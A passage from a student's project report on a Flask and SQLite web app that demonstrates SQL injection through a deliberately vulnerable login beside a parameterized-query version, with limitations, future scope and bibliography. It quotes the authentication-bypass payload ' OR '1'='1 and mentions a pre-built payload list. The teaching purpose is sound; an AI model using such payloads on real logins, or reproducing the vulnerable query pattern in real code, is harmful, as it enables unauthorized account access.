- "SECURE" badge
- Login form with password-type input (hidden characters)
- Security note explaining that injection payloads will not work
- Parameterized query code example
- Three-point explanation of how parameterized queries prevent injection
- Side-by-side comparison of insecure vs secure query construction
- Visual comparison with checkmark/cross indicators

### 16.7 Template: `dashboard.html`

The dashboard features:
- Personalized welcome message with username
- Security badge showing which method was used
- For insecure logins: step-by-step exploit explanation
- For secure logins: three safety points with icons
- Prevention techniques section (cards)
- Project overview table with developer information
- Action buttons to try the other login method, logout, or go home

### 16.8 Static File: `style.css`

The CSS file contains approximately 700+ lines organized into sections:

1. **CSS Custom Properties (Variables):** Color palette, spacing, typography
2. **Reset and Base Styles:** Box-sizing, margin/padding reset, body defaults
3. **Warning Banner:** Red/gradient sticky banner with pulse animation
4. **Navigation:** Fixed-height nav bar with active link highlighting
5. **Flash Messages:** Color-coded notification messages with slide-in animation
6. **Container:** Max-width centered layout
7. **Hero Section:** Landing page hero with gradient text
8. **Cards Grid:** Two-column responsive grid
9. **Info Cards:** Hover-lift effect cards
10. **Login Card:** Centered form card with colored borders
11. **Vulnerability Badge:** Danger/security indicators
12. **Form Elements:** Styled inputs with focus glow
13. **Buttons:** Primary, danger, secondary variants with hover effects
14. **Payload Helper:** Pre-built payload list with copy interaction
15. **Code Blocks:** Monospace font display
16. **Dashboard Components:** Alerts, steps list, prevention cards
17. **Comparison Box:** Side-by-side insecure/secure comparison
18. **Footer:** Bottom content with disclaimer
19. **Responsive Breakpoints:** 1024px, 768px, 480px
20. **Scrollbar Styling:** Custom dark scrollbar

**Responsive Design Approach:**
- Mobile-first approach with progressive enhancement
- Single column layout below 768px
- Optimized touch targets for mobile
- Adjusted font sizes for small screens

### 16.9 Static File: `script.js`

The JavaScript file handles:
1. **Flash Message Auto-Dismiss:** Automatically removes notification messages after 4 seconds with fade animation
2. **Close Button Handler:** Manual dismissal of flash messages
3. **Payload Copy to Clipboard:** Three-tier copy approach:
   - Primary: navigator.clipboard API (modern browsers)
   - Fallback: document.execCommand('copy') via temporary textarea
   - Visual feedback with "Copied!" indicator
4. **Form Validation:** Client-side check for empty fields with visual feedback
5. **Keyboard Navigation Support:** Focus state management

---

## 17. Screenshots

### Screenshot 1: Landing Page
*Insert screenshot of the index.html page showing the hero section, two cards (Insecure and Secure Login), and the demo users table.*

### Screenshot 2: Insecure Login Page
*Insert screenshot of the insecure login page showing the red warning banner, login form, and SQL Injection payload helper section.*

### Screenshot 3: Insecure Login After SQL Injection
*Insert screenshot showing the result of entering `' OR '1'='1` as username and password. The SQL query display area shows the injected query.*

### Screenshot 4: Secure Login Page
*Insert screenshot of the secure login page showing the green security banner and the parameterized query explanation.*

### Screenshot 5: Dashboard (Insecure Login)
*Insert screenshot of the dashboard after logging in through the insecure method, showing the warning alert and exploit steps.*

### Screenshot 6: Dashboard (Secure Login)
*Insert screenshot of the dashboard after logging in through the secure method, showing the success alert and safety points.*

---

## 18. Advantages

1. **Educational Value:** Provides hands-on learning experience for understanding SQL Injection, which is more effective than theoretical study alone.

2. **Safe Environment:** The vulnerable system runs locally on localhost, allowing experimentation without risk to real systems.

3. **Side-by-Side Comparison:** Users can directly compare insecure and secure implementations, reinforcing the learning objective.

4. **Real-Time Feedback:** The displayed SQL queries provide immediate transparency into how injection works.

5. **Interactive Learning:** Pre-built payloads and one-click copy make the demonstration accessible to beginners.

6. **Modern Interface:** A professional, responsive UI enhances the learning experience.

7. **Complete Package:** Includes full report, presentation, viva questions, and bibliography — everything needed for an academic project submission.

8. **Portable:** Uses SQLite (single file database) and Flask (single file server) — easy to set up and run.

9. **Extensible:** The codebase is modular and well-commented, allowing students to extend it with additional features.

10. **Security-Focused:** Clearly labels all vulnerable components as educational, preventing misuse.

---

## 19. Limitations

1. **Plaintext Passwords:** Demo user passwords are stored as plaintext for simplicity. Real applications should use hashed passwords (bcrypt, Argon2).

2. **Limited Database Schema:** The project uses a single table. Real applications have complex relational schemas.

3. **No Advanced Injection Types:** Only basic SQL Injection (authentication bypass) is demonstrated. Blind, union-based, and out-of-band injections are not implemented.

4. **Local Only:** The application runs on localhost and is not designed for production deployment.

5. **No HTTPS:** The development server does not use HTTPS. Real applications require TLS/SSL encryption.

6. **Basic Session Management:** Flask's default client-side sessions are used. Production applications should use server-side sessions with secure configurations.

7. **No Rate Limiting:** The application does not protect against brute force attacks.

8. **Limited Error Handling:** While basic error handling exists, production applications require more comprehensive error management.

---

## 20. Future Scope

1. **Password Hashing:** Implement bcrypt or Argon2 for secure password storage.

2. **Advanced SQL Injection Scenarios:** Add demonstrations of union-based injection, blind injection, and time-based injection.

3. **CAPTCHA Integration:** Add reCAPTCHA to prevent automated attacks.

4. **Two-Factor Authentication (2FA):** Implement 2FA as an additional security layer.

5. **Login Attempt Logging:** Add logging and monitoring for security events.

6. **Rate Limiting:** Implement rate limiting to prevent brute force attacks.

7. **Database Encryption:** Add encryption for data at rest.

8. **Admin Panel:** Create an admin interface for user management and security monitoring.

9. **More Database Systems:** Extend the project to work with MySQL and PostgreSQL for broader learning.

10. **Security Scanning:** Integrate automated security testing tools like OWASP ZAP.

11. **CI/CD Integration:** Add automated security checks to the development pipeline.

12. **Progressive Web App (PWA):** Make the application installable and offline-capable.

---

## 21. Conclusion

This project successfully demonstrates SQL Injection vulnerabilities and their prevention through a practical, interactive web application. By implementing two parallel login systems — one deliberately vulnerable and one secure — students can directly observe how input manipulation can compromise application security and how parameterized queries provide effective protection.

The application serves as an effective educational tool that bridges the gap between theoretical knowledge and practical understanding. It emphasizes several critical lessons for aspiring software developers:

1. **Never Trust User Input:** All user input must be treated as potentially malicious.

2. **Use Parameterized Queries:** Prepared statements are the industry-standard defense against SQL Injection and should be used consistently.

3. **Practice Defense in Depth:** Multiple layers of security (input validation, parameterized queries, least privilege, WAF) provide the best protection.

4. **Security Must Be Built In:** Security cannot be added as an afterthought — it must be considered from the beginning of the development process.

The project fulfills its educational objectives by providing a safe, controlled environment where students can experiment with SQL Injection attacks and see firsthand how proper coding practices prevent them. The complete documentation, including the project report, presentation outline, and viva questions, ensures that the project meets academic requirements for a B.Sc. Computer Science mini project.

---

## 22. Bibliography

### Online Resources

1. OWASP SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
2. OWASP Top Ten Web Application Security Risks — https://owasp.org/www-project-top-ten/
3. SQLite Official Documentation — https://www.sqlite.org/docs.html
4. Flask Official Documentation — https://flask.palletsprojects.com/en/stable/
5. Python SQLite3 Module — https://docs.python.org/3/library/sqlite3.html
6. MDN Web Docs — HTML, CSS, JavaScript — https://developer.mozilla.org/
7. PortSwigger SQL Injection Tutorial — https://portswigger.net/web-security/sql-injection

### Academic Papers

8. Halfond, W. G., Viegas, J., & Orso, A. (2006). A classification of SQL-injection attacks and countermeasures. Proceedings of the IEEE International Symposium on Secure Software Engineering.
9. Tajpour, A., JorJor Zade, S., & Dehghan, M. (2010). Comparison of SQL injection detection and prevention techniques. IEEE International Conference on Education and Management Technology.
10. Shar, L. K., & Tan, H. B. K. (2012). Defeating SQL Injection. Computer, 46(3), 69-76.

### Books

11. Stuttard, D., & Pinto, M. (2011). The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws. 2nd Edition. Wiley.
12. Beigh, R. A. (2020). Cyber Security: An Introduction. Pearson Education.

---

**END OF REPORT**

---

*Project developed by Mohd Yasin Kazi | TYBSc Computer Science | SIWS College*
*For Educational Purpose Only*
